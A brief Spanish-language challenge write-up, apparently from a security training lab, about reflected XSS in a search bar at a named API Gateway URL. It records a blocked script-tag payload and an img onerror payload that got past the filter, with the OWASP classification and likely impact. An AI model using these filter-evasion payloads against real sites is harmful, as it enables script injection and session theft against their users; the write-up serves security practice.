Reto: Reflected XSS

URL objetivo: https://856k42qfe7.execute-api.us-east-1.amazonaws.com/prod/react#/home
Campo vulnerable: Barra de búsqueda (search bar)

Payload 1 (NO funcionó - filtrado por la app):
<script>alert('1')</script>

Payload 2 (SÍ funcionó - evadió el filtro):
<img src='a' onerror=alert('xss')>

Clasificación OWASP: A03:2021 - Injection (Cross-Site Scripting)
Impacto: Ejecución de JavaScript arbitrario en el navegador de la víctima, 
posible robo de sesión, redirección maliciosa, o manipulación del DOM.
